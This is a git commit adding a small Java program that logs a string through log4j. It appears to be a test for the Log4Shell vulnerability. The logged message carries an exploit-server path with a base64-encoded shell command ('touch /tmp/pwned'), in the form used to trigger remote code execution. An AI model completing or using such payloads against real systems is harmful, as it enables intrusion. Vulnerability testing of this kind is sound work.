a0f665ea89e1ef57dfc73688307feed4420db5cb
Dobrosi Andras <dobrosi@gmail.com>
2021-12-14 12:44:06 +0100

    project file + test

---
+++ src/main/java/Main.java
@@ -0,0 +1,10 @@
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class Main {
+    private static final Logger logger = LogManager.getLogger("HelloWorld");
+
+    public static void main(String[] args) {
+        logger.info("Create /tmp/pwned file Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo this row.");
+    }
+}
